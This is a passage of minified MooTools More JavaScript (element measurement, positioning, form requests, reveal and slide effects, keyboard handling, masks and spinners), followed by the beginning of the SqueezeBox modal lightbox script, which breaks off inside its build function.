if(h<d.length-1){f=f[j]=k||{};}else{if($type(k)=="array"){k.push(e);}else{f[j]=$defined(k)?[k,e]:e;}}});});}return a;},cleanQueryString:function(a){return this.split("&").filter(function(e){var b=e.indexOf("="),c=b<0?"":e.substr(0,b),d=e.substr(b+1);
return a?a.run([c,d]):$chk(d);}).join("&");}});Elements.from=function(e,d){if($pick(d,true)){e=e.stripScripts();}var b,c=e.match(/^\s*<(t[dhr]|tbody|tfoot|thead)/i);
if(c){b=new Element("table");var a=c[1].toLowerCase();if(["td","th","tr"].contains(a)){b=new Element("tbody").inject(b);if(a!="tr"){b=new Element("tr").inject(b);
}}}return(b||new Element("div")).set("html",e).getChildren();};Element.implement({measure:function(e){var g=function(h){return !!(!h||h.offsetHeight||h.offsetWidth);
};if(g(this)){return e.apply(this);}var d=this.getParent(),f=[],b=[];while(!g(d)&&d!=document.body){b.push(d.expose());d=d.getParent();}var c=this.expose();
var a=e.apply(this);c();b.each(function(h){h();});return a;},expose:function(){if(this.getStyle("display")!="none"){return $empty;}var a=this.style.cssText;
this.setStyles({display:"block",position:"absolute",visibility:"hidden"});return function(){this.style.cssText=a;}.bind(this);},getDimensions:function(a){a=$merge({computeSize:false},a);
var f={};var d=function(g,e){return(e.computeSize)?g.getComputedSize(e):g.getSize();};var b=this.getParent("body");if(b&&this.getStyle("display")=="none"){f=this.measure(function(){return d(this,a);
});}else{if(b){try{f=d(this,a);}catch(c){}}else{f={x:0,y:0};}}return $chk(f.x)?$extend(f,{width:f.x,height:f.y}):$extend(f,{x:f.width,y:f.height});},getComputedSize:function(a){a=$merge({styles:["padding","border"],plains:{height:["top","bottom"],width:["left","right"]},mode:"both"},a);
var c={width:0,height:0};switch(a.mode){case"vertical":delete c.width;delete a.plains.width;break;case"horizontal":delete c.height;delete a.plains.height;
break;}var b=[];$each(a.plains,function(g,f){g.each(function(h){a.styles.each(function(i){b.push((i=="border")?i+"-"+h+"-width":i+"-"+h);});});});var e={};
b.each(function(f){e[f]=this.getComputedStyle(f);},this);var d=[];$each(a.plains,function(g,f){var h=f.capitalize();c["total"+h]=c["computed"+h]=0;g.each(function(i){c["computed"+i.capitalize()]=0;
b.each(function(k,j){if(k.test(i)){e[k]=e[k].toInt()||0;c["total"+h]=c["total"+h]+e[k];c["computed"+i.capitalize()]=c["computed"+i.capitalize()]+e[k];}if(k.test(i)&&f!=k&&(k.test("border")||k.test("padding"))&&!d.contains(k)){d.push(k);
c["computed"+h]=c["computed"+h]-e[k];}});});});["Width","Height"].each(function(g){var f=g.toLowerCase();if(!$chk(c[f])){return;}c[f]=c[f]+this["offset"+g]+c["computed"+g];
c["total"+g]=c[f]+c["total"+g];delete c["computed"+g];},this);return $extend(e,c);}});(function(){var a=Element.prototype.position;Element.implement({position:function(g){if(g&&($defined(g.x)||$defined(g.y))){return a?a.apply(this,arguments):this;
}$each(g||{},function(u,t){if(!$defined(u)){delete g[t];}});g=$merge({relativeTo:document.body,position:{x:"center",y:"center"},edge:false,offset:{x:0,y:0},returnPos:false,relFixedPosition:false,ignoreMargins:false,ignoreScroll:false,allowNegative:false},g);
var r={x:0,y:0},e=false;var c=this.measure(function(){return document.id(this.getOffsetParent());});if(c&&c!=this.getDocument().body){r=c.measure(function(){return this.getPosition();
});e=c!=document.id(g.relativeTo);g.offset.x=g.offset.x-r.x;g.offset.y=g.offset.y-r.y;}var s=function(t){if($type(t)!="string"){return t;}t=t.toLowerCase();
var u={};if(t.test("left")){u.x="left";}else{if(t.test("right")){u.x="right";}else{u.x="center";}}if(t.test("upper")||t.test("top")){u.y="top";}else{if(t.test("bottom")){u.y="bottom";
}else{u.y="center";}}return u;};g.edge=s(g.edge);g.position=s(g.position);if(!g.edge){if(g.position.x=="center"&&g.position.y=="center"){g.edge={x:"center",y:"center"};
}else{g.edge={x:"left",y:"top"};}}this.setStyle("position","absolute");var f=document.id(g.relativeTo)||document.body,d=f==document.body?window.getScroll():f.getPosition(),l=d.y,h=d.x;
var n=this.getDimensions({computeSize:true,styles:["padding","border","margin"]});var j={},o=g.offset.y,q=g.offset.x,k=window.getSize();switch(g.position.x){case"left":j.x=h+q;
break;case"right":j.x=h+q+f.offsetWidth;break;default:j.x=h+((f==document.body?k.x:f.offsetWidth)/2)+q;break;}switch(g.position.y){case"top":j.y=l+o;break;
case"bottom":j.y=l+o+f.offsetHeight;break;default:j.y=l+((f==document.body?k.y:f.offsetHeight)/2)+o;break;}if(g.edge){var b={};switch(g.edge.x){case"left":b.x=0;
break;case"right":b.x=-n.x-n.computedRight-n.computedLeft;break;default:b.x=-(n.totalWidth/2);break;}switch(g.edge.y){case"top":b.y=0;break;case"bottom":b.y=-n.y-n.computedTop-n.computedBottom;
break;default:b.y=-(n.totalHeight/2);break;}j.x+=b.x;j.y+=b.y;}j={left:((j.x>=0||e||g.allowNegative)?j.x:0).toInt(),top:((j.y>=0||e||g.allowNegative)?j.y:0).toInt()};
var i={left:"x",top:"y"};["minimum","maximum"].each(function(t){["left","top"].each(function(u){var v=g[t]?g[t][i[u]]:null;if(v!=null&&j[u]<v){j[u]=v;}});
});if(f.getStyle("position")=="fixed"||g.relFixedPosition){var m=window.getScroll();j.top+=m.y;j.left+=m.x;}if(g.ignoreScroll){var p=f.getScroll();j.top-=p.y;
j.left-=p.x;}if(g.ignoreMargins){j.left+=(g.edge.x=="right"?n["margin-right"]:g.edge.x=="center"?-n["margin-left"]+((n["margin-right"]+n["margin-left"])/2):-n["margin-left"]);
j.top+=(g.edge.y=="bottom"?n["margin-bottom"]:g.edge.y=="center"?-n["margin-top"]+((n["margin-bottom"]+n["margin-top"])/2):-n["margin-top"]);}j.left=Math.ceil(j.left);
j.top=Math.ceil(j.top);if(g.returnPos){return j;}else{this.setStyles(j);}return this;}});})();Element.implement({isDisplayed:function(){return this.getStyle("display")!="none";
},isVisible:function(){var a=this.offsetWidth,b=this.offsetHeight;return(a==0&&b==0)?false:(a>0&&b>0)?true:this.isDisplayed();},toggle:function(){return this[this.isDisplayed()?"hide":"show"]();
},hide:function(){var b;try{b=this.getStyle("display");}catch(a){}return this.store("originalDisplay",b||"").setStyle("display","none");},show:function(a){a=a||this.retrieve("originalDisplay")||"block";
return this.setStyle("display",(a=="none")?"block":a);},swapClass:function(a,b){return this.removeClass(a).addClass(b);}});if(!window.Form){window.Form={};
}(function(){Form.Request=new Class({Binds:["onSubmit","onFormValidate"],Implements:[Options,Events,Class.Occlude],options:{requestOptions:{evalScripts:true,useSpinner:true,emulation:false,link:"ignore"},extraData:{},resetForm:true},property:"form.request",initialize:function(b,c,a){this.element=document.id(b);
if(this.occlude()){return this.occluded;}this.update=document.id(c);this.setOptions(a);this.makeRequest();if(this.options.resetForm){this.request.addEvent("success",function(){$try(function(){this.element.reset();
}.bind(this));if(window.OverText){OverText.update();}}.bind(this));}this.attach();},toElement:function(){return this.element;},makeRequest:function(){this.request=new Request.HTML($merge({update:this.update,emulation:false,spinnerTarget:this.element,method:this.element.get("method")||"post"},this.options.requestOptions)).addEvents({success:function(b,a){["complete","success"].each(function(c){this.fireEvent(c,[this.update,b,a]);
},this);}.bind(this),failure:function(a){this.fireEvent("complete").fireEvent("failure",a);}.bind(this),exception:function(){this.fireEvent("failure",xhr);
}.bind(this)});},attach:function(a){a=$pick(a,true);method=a?"addEvent":"removeEvent";var b=this.element.retrieve("validator");if(b){b[method]("onFormValidate",this.onFormValidate);
}if(!b||!a){this.element[method]("submit",this.onSubmit);}},detach:function(){this.attach(false);},enable:function(){this.attach();},disable:function(){this.detach();
},onFormValidate:function(b,a,d){var c=this.element.retrieve("validator");if(b||(c&&!c.options.stopOnFailure)){if(d&&d.stop){d.stop();}this.send();}},onSubmit:function(a){if(this.element.retrieve("validator")){this.detach();
return;}a.stop();this.send();},send:function(){var b=this.element.toQueryString().trim();var a=$H(this.options.extraData).toQueryString();if(b){b+="&"+a;
}else{b=a;}this.fireEvent("send",[this.element,b.parseQueryString()]);this.request.send({data:b,url:this.element.get("action")});return this;}});Element.Properties.formRequest={set:function(){var a=Array.link(arguments,{options:Object.type,update:Element.type,updateId:String.type});
var c=a.update||a.updateId;var b=this.retrieve("form.request");if(c){if(b){b.update=document.id(c);}this.store("form.request:update",c);}if(a.options){if(b){b.setOptions(a.options);
}this.store("form.request:options",a.options);}return this;},get:function(){var a=Array.link(arguments,{options:Object.type,update:Element.type,updateId:String.type});
var b=a.update||a.updateId;if(a.options||b||!this.retrieve("form.request")){if(a.options||!this.retrieve("form.request:options")){this.set("form.request",a.options);
}if(b){this.set("form.request",b);}this.store("form.request",new Form.Request(this,this.retrieve("form.request:update"),this.retrieve("form.request:options")));
}return this.retrieve("form.request");}};Element.implement({formUpdate:function(b,a){this.get("form.request",b,a).send();return this;}});})();Form.Request.Append=new Class({Extends:Form.Request,options:{useReveal:true,revealOptions:{},inject:"bottom"},makeRequest:function(){this.request=new Request.HTML($merge({url:this.element.get("action"),method:this.element.get("method")||"post",spinnerTarget:this.element},this.options.requestOptions,{evalScripts:false})).addEvents({success:function(b,g,f,a){var c;
var d=Elements.from(f);if(d.length==1){c=d[0];}else{c=new Element("div",{styles:{display:"none"}}).adopt(d);}c.inject(this.update,this.options.inject);
if(this.options.requestOptions.evalScripts){$exec(a);}this.fireEvent("beforeEffect",c);var e=function(){this.fireEvent("success",[c,this.update,b,g,f,a]);
}.bind(this);if(this.options.useReveal){c.get("reveal",this.options.revealOptions).chain(e);c.reveal();}else{e();}}.bind(this),failure:function(a){this.fireEvent("failure",a);
}.bind(this)});}});Fx.Reveal=new Class({Extends:Fx.Morph,options:{link:"cancel",styles:["padding","border","margin"],transitionOpacity:!Browser.Engine.trident4,mode:"vertical",display:"block",hideInputs:Browser.Engine.trident?"select, input, textarea, object, embed":false},dissolve:function(){try{if(!this.hiding&&!this.showing){if(this.element.getStyle("display")!="none"){this.hiding=true;
this.showing=false;this.hidden=true;this.cssText=this.element.style.cssText;var d=this.element.getComputedSize({styles:this.options.styles,mode:this.options.mode});
this.element.setStyle("display",this.options.display);if(this.options.transitionOpacity){d.opacity=1;}var b={};$each(d,function(f,e){b[e]=[f,0];},this);
this.element.setStyle("overflow","hidden");var a=this.options.hideInputs?this.element.getElements(this.options.hideInputs):null;this.$chain.unshift(function(){if(this.hidden){this.hiding=false;
$each(d,function(f,e){d[e]=f;},this);this.element.style.cssText=this.cssText;this.element.setStyle("display","none");if(a){a.setStyle("visibility","visible");
}}this.fireEvent("hide",this.element);this.callChain();}.bind(this));if(a){a.setStyle("visibility","hidden");}this.start(b);}else{this.callChain.delay(10,this);
this.fireEvent("complete",this.element);this.fireEvent("hide",this.element);}}else{if(this.options.link=="chain"){this.chain(this.dissolve.bind(this));
}else{if(this.options.link=="cancel"&&!this.hiding){this.cancel();this.dissolve();}}}}catch(c){this.hiding=false;this.element.setStyle("display","none");
this.callChain.delay(10,this);this.fireEvent("complete",this.element);this.fireEvent("hide",this.element);}return this;},reveal:function(){try{if(!this.showing&&!this.hiding){if(this.element.getStyle("display")=="none"||this.element.getStyle("visiblity")=="hidden"||this.element.getStyle("opacity")==0){this.showing=true;
this.hiding=this.hidden=false;var d;this.cssText=this.element.style.cssText;this.element.measure(function(){d=this.element.getComputedSize({styles:this.options.styles,mode:this.options.mode});
}.bind(this));$each(d,function(f,e){d[e]=f;});if($chk(this.options.heightOverride)){d.height=this.options.heightOverride.toInt();}if($chk(this.options.widthOverride)){d.width=this.options.widthOverride.toInt();
}if(this.options.transitionOpacity){this.element.setStyle("opacity",0);d.opacity=1;}var b={height:0,display:this.options.display};$each(d,function(f,e){b[e]=0;
});this.element.setStyles($merge(b,{overflow:"hidden"}));var a=this.options.hideInputs?this.element.getElements(this.options.hideInputs):null;if(a){a.setStyle("visibility","hidden");
}this.start(d);this.$chain.unshift(function(){this.element.style.cssText=this.cssText;this.element.setStyle("display",this.options.display);if(!this.hidden){this.showing=false;
}if(a){a.setStyle("visibility","visible");}this.callChain();this.fireEvent("show",this.element);}.bind(this));}else{this.callChain();this.fireEvent("complete",this.element);
this.fireEvent("show",this.element);}}else{if(this.options.link=="chain"){this.chain(this.reveal.bind(this));}else{if(this.options.link=="cancel"&&!this.showing){this.cancel();
this.reveal();}}}}catch(c){this.element.setStyles({display:this.options.display,visiblity:"visible",opacity:1});this.showing=false;this.callChain.delay(10,this);
this.fireEvent("complete",this.element);this.fireEvent("show",this.element);}return this;},toggle:function(){if(this.element.getStyle("display")=="none"||this.element.getStyle("visiblity")=="hidden"||this.element.getStyle("opacity")==0){this.reveal();
}else{this.dissolve();}return this;},cancel:function(){this.parent.apply(this,arguments);this.element.style.cssText=this.cssText;this.hidding=false;this.showing=false;
}});Element.Properties.reveal={set:function(a){var b=this.retrieve("reveal");if(b){b.cancel();}return this.eliminate("reveal").store("reveal:options",a);
},get:function(a){if(a||!this.retrieve("reveal")){if(a||!this.retrieve("reveal:options")){this.set("reveal",a);}this.store("reveal",new Fx.Reveal(this,this.retrieve("reveal:options")));
}return this.retrieve("reveal");}};Element.Properties.dissolve=Element.Properties.reveal;Element.implement({reveal:function(a){this.get("reveal",a).reveal();
return this;},dissolve:function(a){this.get("reveal",a).dissolve();return this;},nix:function(){var a=Array.link(arguments,{destroy:Boolean.type,options:Object.type});
this.get("reveal",a.options).dissolve().chain(function(){this[a.destroy?"destroy":"dispose"]();}.bind(this));return this;},wink:function(){var b=Array.link(arguments,{duration:Number.type,options:Object.type});
var a=this.get("reveal",b.options);a.reveal().chain(function(){(function(){a.dissolve();}).delay(b.duration||2000);});}});Fx.Slide=new Class({Extends:Fx,options:{mode:"vertical",wrapper:false,hideOverflow:true},initialize:function(b,a){this.addEvent("complete",function(){this.open=(this.wrapper["offset"+this.layout.capitalize()]!=0);
if(this.open){this.wrapper.setStyle("height","");}if(this.open&&Browser.Engine.webkit419){this.element.dispose().inject(this.wrapper);}},true);this.element=this.subject=document.id(b);
this.parent(a);var d=this.element.retrieve("wrapper");var c=this.element.getStyles("margin","position","overflow");if(this.options.hideOverflow){c=$extend(c,{overflow:"hidden"});
}if(this.options.wrapper){d=document.id(this.options.wrapper).setStyles(c);}this.wrapper=d||new Element("div",{styles:c}).wraps(this.element);this.element.store("wrapper",this.wrapper).setStyle("margin",0);
this.now=[];this.open=true;},vertical:function(){this.margin="margin-top";this.layout="height";this.offset=this.element.offsetHeight;},horizontal:function(){this.margin="margin-left";
this.layout="width";this.offset=this.element.offsetWidth;},set:function(a){this.element.setStyle(this.margin,a[0]);this.wrapper.setStyle(this.layout,a[1]);
return this;},compute:function(c,b,a){return[0,1].map(function(d){return Fx.compute(c[d],b[d],a);});},start:function(b,e){if(!this.check(b,e)){return this;
}this[e||this.options.mode]();var d=this.element.getStyle(this.margin).toInt();var c=this.wrapper.getStyle(this.layout).toInt();var a=[[d,c],[0,this.offset]];
var g=[[d,c],[-this.offset,0]];var f;switch(b){case"in":f=a;break;case"out":f=g;break;case"toggle":f=(c==0)?a:g;}return this.parent(f[0],f[1]);},slideIn:function(a){return this.start("in",a);
},slideOut:function(a){return this.start("out",a);},hide:function(a){this[a||this.options.mode]();this.open=false;return this.set([-this.offset,0]);},show:function(a){this[a||this.options.mode]();
this.open=true;return this.set([0,this.offset]);},toggle:function(a){return this.start("toggle",a);}});Element.Properties.slide={set:function(b){var a=this.retrieve("slide");
if(a){a.cancel();}return this.eliminate("slide").store("slide:options",$extend({link:"cancel"},b));},get:function(a){if(a||!this.retrieve("slide")){if(a||!this.retrieve("slide:options")){this.set("slide",a);
}this.store("slide",new Fx.Slide(this,this.retrieve("slide:options")));}return this.retrieve("slide");}};Element.implement({slide:function(d,e){d=d||"toggle";
var b=this.get("slide"),a;switch(d){case"hide":b.hide(e);break;case"show":b.show(e);break;case"toggle":var c=this.retrieve("slide:flag",b.open);b[c?"slideOut":"slideIn"](e);
this.store("slide:flag",!c);a=true;break;default:b.start(d,e);}if(!a){this.eliminate("slide:flag");}return this;}});Request.implement({options:{initialDelay:5000,delay:5000,limit:60000},startTimer:function(b){var a=function(){if(!this.running){this.send({data:b});
}};this.timer=a.delay(this.options.initialDelay,this);this.lastDelay=this.options.initialDelay;this.completeCheck=function(c){$clear(this.timer);this.lastDelay=(c)?this.options.delay:(this.lastDelay+this.options.delay).min(this.options.limit);
this.timer=a.delay(this.lastDelay,this);};return this.addEvent("complete",this.completeCheck);},stopTimer:function(){$clear(this.timer);return this.removeEvent("complete",this.completeCheck);
}});var IframeShim=new Class({Implements:[Options,Events,Class.Occlude],options:{className:"iframeShim",src:'javascript:false;document.write("");',display:false,zIndex:null,margin:0,offset:{x:0,y:0},browsers:(Browser.Engine.trident4||(Browser.Engine.gecko&&!Browser.Engine.gecko19&&Browser.Platform.mac))},property:"IframeShim",initialize:function(b,a){this.element=document.id(b);
if(this.occlude()){return this.occluded;}this.setOptions(a);this.makeShim();return this;},makeShim:function(){if(this.options.browsers){var c=this.element.getStyle("zIndex").toInt();
if(!c){c=1;var b=this.element.getStyle("position");if(b=="static"||!b){this.element.setStyle("position","relative");}this.element.setStyle("zIndex",c);
}c=($chk(this.options.zIndex)&&c>this.options.zIndex)?this.options.zIndex:c-1;if(c<0){c=1;}this.shim=new Element("iframe",{src:this.options.src,scrolling:"no",frameborder:0,styles:{zIndex:c,position:"absolute",border:"none",filter:"progid:DXImageTransform.Microsoft.Alpha(style=0,opacity=0)"},"class":this.options.className}).store("IframeShim",this);
var a=(function(){this.shim.inject(this.element,"after");this[this.options.display?"show":"hide"]();this.fireEvent("inject");}).bind(this);if(!IframeShim.ready){window.addEvent("load",a);
}else{a();}}else{this.position=this.hide=this.show=this.dispose=$lambda(this);}},position:function(){if(!IframeShim.ready||!this.shim){return this;}var a=this.element.measure(function(){return this.getSize();
});if(this.options.margin!=undefined){a.x=a.x-(this.options.margin*2);a.y=a.y-(this.options.margin*2);this.options.offset.x+=this.options.margin;this.options.offset.y+=this.options.margin;
}this.shim.set({width:a.x,height:a.y}).position({relativeTo:this.element,offset:this.options.offset});return this;},hide:function(){if(this.shim){this.shim.setStyle("display","none");
}return this;},show:function(){if(this.shim){this.shim.setStyle("display","block");}return this.position();},dispose:function(){if(this.shim){this.shim.dispose();
}return this;},destroy:function(){if(this.shim){this.shim.destroy();}return this;}});window.addEvent("load",function(){IframeShim.ready=true;});(function(){var a=this.Keyboard=new Class({Extends:Events,Implements:[Options,Log],options:{defaultEventType:"keydown",active:false,events:{},nonParsedEvents:["activate","deactivate","onactivate","ondeactivate","changed","onchanged"]},initialize:function(f){this.setOptions(f);
this.setup();},setup:function(){this.addEvents(this.options.events);if(a.manager&&!this.manager){a.manager.manage(this);}if(this.options.active){this.activate();
}},handle:function(h,g){if(h.preventKeyboardPropagation){return;}var f=!!this.manager;if(f&&this.activeKB){this.activeKB.handle(h,g);if(h.preventKeyboardPropagation){return;
}}this.fireEvent(g,h);if(!f&&this.activeKB){this.activeKB.handle(h,g);}},addEvent:function(h,g,f){return this.parent(a.parse(h,this.options.defaultEventType,this.options.nonParsedEvents),g,f);
},removeEvent:function(g,f){return this.parent(a.parse(g,this.options.defaultEventType,this.options.nonParsedEvents),f);},toggleActive:function(){return this[this.active?"deactivate":"activate"]();
},activate:function(f){if(f){if(f!=this.activeKB){this.previous=this.activeKB;}this.activeKB=f.fireEvent("activate");a.manager.fireEvent("changed");}else{if(this.manager){this.manager.activate(this);
}}return this;},deactivate:function(f){if(f){if(f===this.activeKB){this.activeKB=null;f.fireEvent("deactivate");a.manager.fireEvent("changed");}}else{if(this.manager){this.manager.deactivate(this);
}}return this;},relenquish:function(){if(this.previous){this.activate(this.previous);}},manage:function(f){if(f.manager){f.manager.drop(f);}this.instances.push(f);
f.manager=this;if(!this.activeKB){this.activate(f);}else{this._disable(f);}},_disable:function(f){if(this.activeKB==f){this.activeKB=null;}},drop:function(f){this._disable(f);
this.instances.erase(f);},instances:[],trace:function(){a.trace(this);},each:function(f){a.each(this,f);}});var b={};var c=["shift","control","alt","meta"];
var e=/^(?:shift|control|ctrl|alt|meta)$/;a.parse=function(h,g,k){if(k&&k.contains(h.toLowerCase())){return h;}h=h.toLowerCase().replace(/^(keyup|keydown):/,function(m,l){g=l;
return"";});if(!b[h]){var f,j={};h.split("+").each(function(l){if(e.test(l)){j[l]=true;}else{f=l;}});j.control=j.control||j.ctrl;var i=[];c.each(function(l){if(j[l]){i.push(l);
}});if(f){i.push(f);}b[h]=i.join("+");}return g+":"+b[h];};a.each=function(f,g){var h=f||a.manager;while(h){g.run(h);h=h.activeKB;}};a.stop=function(f){f.preventKeyboardPropagation=true;
};a.manager=new a({active:true});a.trace=function(f){f=f||a.manager;f.enableLog();f.log("the following items have focus: ");a.each(f,function(g){f.log(document.id(g.widget)||g.wiget||g);
});};var d=function(g){var f=[];c.each(function(h){if(g[h]){f.push(h);}});if(!e.test(g.key)){f.push(g.key);}a.manager.handle(g,g.type+":"+f.join("+"));
};document.addEvents({keyup:d,keydown:d});Event.Keys.extend({shift:16,control:17,alt:18,capslock:20,pageup:33,pagedown:34,end:35,home:36,numlock:144,scrolllock:145,";":186,"=":187,",":188,"-":Browser.Engine.Gecko?109:189,".":190,"/":191,"`":192,"[":219,"\\":220,"]":221,"'":222});
})();Keyboard.prototype.options.nonParsedEvents.combine(["rebound","onrebound"]);Keyboard.implement({addShortcut:function(b,a){this.shortcuts=this.shortcuts||[];
this.shortcutIndex=this.shortcutIndex||{};a.getKeyboard=$lambda(this);a.name=b;this.shortcutIndex[b]=a;this.shortcuts.push(a);if(a.keys){this.addEvent(a.keys,a.handler);
}return this;},addShortcuts:function(b){for(var a in b){this.addShortcut(a,b[a]);}return this;},getShortcuts:function(){return this.shortcuts||[];},getShortcut:function(a){return(this.shortcutIndex||{})[a];
}});Keyboard.rebind=function(b,a){$splat(a).each(function(c){c.getKeyboard().removeEvent(c.keys,c.handler);c.getKeyboard().addEvent(b,c.handler);c.keys=b;
c.getKeyboard().fireEvent("rebound");});};Keyboard.getActiveShortcuts=function(b){var a=[],c=[];Keyboard.each(b,[].push.bind(a));a.each(function(d){c.extend(d.getShortcuts());
});return c;};Keyboard.getShortcut=function(c,b,d){d=d||{};var a=d.many?[]:null,e=d.many?function(g){var f=g.getShortcut(c);if(f){a.push(f);}}:function(f){if(!a){a=f.getShortcut(c);
}};Keyboard.each(b,e);return a;};Keyboard.getShortcuts=function(b,a){return Keyboard.getShortcut(b,a,{many:true});};var Mask=new Class({Implements:[Options,Events],Binds:["position"],options:{style:{},"class":"mask",maskMargins:false,useIframeShim:true,iframeShimOptions:{}},initialize:function(b,a){this.target=document.id(b)||document.id(document.body);
this.target.store("Mask",this);this.setOptions(a);this.render();this.inject();},render:function(){this.element=new Element("div",{"class":this.options["class"],id:this.options.id||"mask-"+$time(),styles:$merge(this.options.style,{display:"none"}),events:{click:function(){this.fireEvent("click");
if(this.options.hideOnClick){this.hide();}}.bind(this)}});this.hidden=true;},toElement:function(){return this.element;},inject:function(b,a){a=a||this.options.inject?this.options.inject.where:""||this.target==document.body?"inside":"after";
b=b||this.options.inject?this.options.inject.target:""||this.target;this.element.inject(b,a);if(this.options.useIframeShim){this.shim=new IframeShim(this.element,this.options.iframeShimOptions);
this.addEvents({show:this.shim.show.bind(this.shim),hide:this.shim.hide.bind(this.shim),destroy:this.shim.destroy.bind(this.shim)});}},position:function(){this.resize(this.options.width,this.options.height);
this.element.position({relativeTo:this.target,position:"topLeft",ignoreMargins:!this.options.maskMargins,ignoreScroll:this.target==document.body});return this;
},resize:function(a,e){var b={styles:["padding","border"]};if(this.options.maskMargins){b.styles.push("margin");}var d=this.target.getComputedSize(b);if(this.target==document.body){var c=window.getSize();
if(d.totalHeight<c.y){d.totalHeight=c.y;}if(d.totalWidth<c.x){d.totalWidth=c.x;}}this.element.setStyles({width:$pick(a,d.totalWidth,d.x),height:$pick(e,d.totalHeight,d.y)});
return this;},show:function(){if(!this.hidden){return this;}window.addEvent("resize",this.position);this.position();this.showMask.apply(this,arguments);
return this;},showMask:function(){this.element.setStyle("display","block");this.hidden=false;this.fireEvent("show");},hide:function(){if(this.hidden){return this;
}window.removeEvent("resize",this.position);this.hideMask.apply(this,arguments);if(this.options.destroyOnHide){return this.destroy();}return this;},hideMask:function(){this.element.setStyle("display","none");
this.hidden=true;this.fireEvent("hide");},toggle:function(){this[this.hidden?"show":"hide"]();},destroy:function(){this.hide();this.element.destroy();this.fireEvent("destroy");
this.target.eliminate("mask");}});Element.Properties.mask={set:function(b){var a=this.retrieve("mask");return this.eliminate("mask").store("mask:options",b);
},get:function(a){if(a||!this.retrieve("mask")){if(this.retrieve("mask")){this.retrieve("mask").destroy();}if(a||!this.retrieve("mask:options")){this.set("mask",a);
}this.store("mask",new Mask(this,this.retrieve("mask:options")));}return this.retrieve("mask");}};Element.implement({mask:function(a){this.get("mask",a).show();
return this;},unmask:function(){this.get("mask").hide();return this;}});var Spinner=new Class({Extends:Mask,options:{"class":"spinner",containerPosition:{},content:{"class":"spinner-content"},messageContainer:{"class":"spinner-msg"},img:{"class":"spinner-img"},fxOptions:{link:"chain"}},initialize:function(){this.parent.apply(this,arguments);
this.target.store("spinner",this);var a=function(){this.active=false;}.bind(this);this.addEvents({hide:a,show:a});},render:function(){this.parent();this.element.set("id",this.options.id||"spinner-"+$time());
this.content=document.id(this.options.content)||new Element("div",this.options.content);this.content.inject(this.element);if(this.options.message){this.msg=document.id(this.options.message)||new Element("p",this.options.messageContainer).appendText(this.options.message);
this.msg.inject(this.content);}if(this.options.img){this.img=document.id(this.options.img)||new Element("div",this.options.img);this.img.inject(this.content);
}this.element.set("tween",this.options.fxOptions);},show:function(a){if(this.active){return this.chain(this.show.bind(this));}if(!this.hidden){this.callChain.delay(20,this);
return this;}this.active=true;return this.parent(a);},showMask:function(a){var b=function(){this.content.position($merge({relativeTo:this.element},this.options.containerPosition));
}.bind(this);if(a){this.parent();b();}else{this.element.setStyles({display:"block",opacity:0}).tween("opacity",this.options.style.opacity||0.9);b();this.hidden=false;
this.fireEvent("show");this.callChain();}},hide:function(a){if(this.active){return this.chain(this.hide.bind(this));}if(this.hidden){this.callChain.delay(20,this);
return this;}this.active=true;return this.parent(a);},hideMask:function(a){if(a){return this.parent();}this.element.tween("opacity",0).get("tween").chain(function(){this.element.setStyle("display","none");
this.hidden=true;this.fireEvent("hide");this.callChain();}.bind(this));},destroy:function(){this.content.destroy();this.parent();this.target.eliminate("spinner");
}});Spinner.implement(new Chain);if(window.Request){Request=Class.refactor(Request,{options:{useSpinner:false,spinnerOptions:{},spinnerTarget:false},initialize:function(a){this._send=this.send;
this.send=function(c){if(this.spinner){this.spinner.chain(this._send.bind(this,c)).show();}else{this._send(c);}return this;};this.previous(a);var b=document.id(this.options.spinnerTarget)||document.id(this.options.update);
if(this.options.useSpinner&&b){this.spinner=b.get("spinner",this.options.spinnerOptions);["onComplete","onException","onCancel"].each(function(c){this.addEvent(c,this.spinner.hide.bind(this.spinner));
},this);}},getSpinner:function(){return this.spinner;}});}Element.Properties.spinner={set:function(a){var b=this.retrieve("spinner");return this.eliminate("spinner").store("spinner:options",a);
},get:function(a){if(a||!this.retrieve("spinner")){if(this.retrieve("spinner")){this.retrieve("spinner").destroy();}if(a||!this.retrieve("spinner:options")){this.set("spinner",a);
}new Spinner(this,this.retrieve("spinner:options"));}return this.retrieve("spinner");}};Element.implement({spin:function(a){this.get("spinner",a).show();
return this;},unspin:function(){var a=Array.link(arguments,{options:Object.type,callback:Function.type});this.get("spinner",a.options).hide(a.callback);
return this;}});

/**
 * SqueezeBox - Expandable Lightbox
 *
 * Allows to open various content as modal,
 * centered and animated box.
 *
 * Dependencies: MooTools 1.2
 *
 * Inspired by
 *  ... Lokesh Dhakar	- The original Lightbox v2
 *
 * @version		1.1 rc4
 *
 * @license		MIT-style license
 * @author		Harald Kirschner <mail [at] digitarald.de>
 * @copyright	Author
 */

var SqueezeBox = {

	presets: {
		onOpen: $empty,
		onClose: $empty,
		onUpdate: $empty,
		onResize: $empty,
		onMove: $empty,
		onShow: $empty,
		onHide: $empty,
		size: {x: 600, y: 450},
		sizeLoading: {x: 200, y: 150},
		marginInner: {x: 20, y: 20},
		marginImage: {x: 50, y: 75},
		handler: false,
		target: null,
		closable: true,
		closeBtn: true,
		zIndex: 65555,
		overlayOpacity: 0.7,
		classWindow: '',
		classOverlay: '',
		overlayFx: {},
		resizeFx: {},
		contentFx: {},
		parse: false, // 'rel'
		parseSecure: false,
		shadow: true,
		document: null,
		ajaxOptions: {}
	},

	initialize: function(presets) {
		if (this.options) return this;

		this.presets = $merge(this.presets, presets);
		this.doc = this.presets.document || document;
		this.options = {};
		this.setOptions(this.presets).build();
		this.bound = {
			window: this.reposition.bind(this, [null]),
			scroll: this.checkTarget.bind(this),
			close: this.close.bind(this),
			key: this.onKey.bind(this)
		};
		this.isOpen = this.isLoading = false;
		return this;
	},

	build: function() {
		this.overlay = new Element('div', {
			id: 'sbox-overlay',
			styles: {display: 'none', zIndex: this.options.zIndex}
		});
		this.win = new Element('div', {
			id: 'sbox-window',
			styles: {display: 'none', zIndex: this.options.zIndex + 2}
		});
		if (this.options.shadow) {
			if (Browser.Engine.webkit420) {
				this.win.setStyle('-webkit-box-shadow', '0 0 10px rgba(0, 0, 0, 0.7)');
			} else if (!Browser.Engine.trident4) {
				var shadow = new Element('div', {'class': 'sbox-bg-wrap'}).inject(this.win);
				var relay = function(e) {
					this.overlay.fireEvent('click', [e]);
				}.bind(this);
				['n', 'ne', 'e', 'se', 's', 'sw', 'w', 'nw'].each(function(dir) {
					new Element('div', {'class': 'sbox-bg sbox-bg-' + dir}).inject(shadow).addEvent('click', relay);
				});
			}
		}
		this.content = new Element('div', {id: 'sbox-content'}).inject(this.win);
